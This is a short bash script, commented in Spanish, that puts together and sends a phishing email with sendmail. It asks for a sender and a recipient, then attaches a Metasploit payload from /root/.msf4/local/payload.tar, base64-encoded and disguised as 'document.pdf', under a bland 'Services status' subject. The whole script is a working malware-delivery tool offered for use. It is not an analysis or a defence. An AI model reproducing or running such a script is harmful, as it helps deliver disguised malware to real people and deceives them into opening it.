#!/bin/bash

# Variables para el remitente, el destinatario, el asunto y la ubicación del payload
read -p "Correo remitente: " sender
read -p "Correo destino: " recipient
subject="Services status"
attachment="/root/.msf4/local/payload.tar"

# Creación de un archivo temporal para construir el cuerpo del correo
email_body=$(mktemp)

echo "-- Construyendo el correo -"
echo "[1/6] Agregando datos básicos..."
sleep 1
# Construct the email message with tar attachment
#
echo "To: $recipient" >> $email_body
echo "From: $sender" >> $email_body
echo "Subject: $subject" >> $email_body
echo "[2/6] Construyendo el cuerpo del payload adjunto..."
sleep 1
echo "Content-Type: multipart/mixed; boundary=\"BOUNDARY\"" >> $email_body
echo "" >> $email_body
echo "--BOUNDARY" >> $email_body
echo "Content-Type: text/plain; charset=UTF-8" >> $email_body
echo "" >> $email_body
echo "Report." >> $email_body
echo "" >> $email_body
echo "--BOUNDARY" >> $email_body
echo "Content-Type: application/x-tar" >> $email_body
echo "Content-Disposition: attachment; filename=\"document.pdf\"" >> $email_body
echo "Content-Transfer-Encoding: base64" >> $email_body
echo "" >> $email_body
echo "[3/6] Obteniendo base64 del payload..."
base64 $attachment >> $email_body
echo "" >> $email_body
echo "--BOUNDARY--" >> $email_body

echo "[4/6] Enviando..."
# Send the email using Sendmail
result=$(sendmail -v -t < $email_body)

echo "[5/6] Resultados del envío"
echo "--------------------------"
echo $result
echo "--------------------------"
sleep 1

echo "[6/6] Limpieza de archivo temporal..."
sleep 1
# Remove the temporary email body file
rm $email_body
echo "-- Proceso finalizado --"
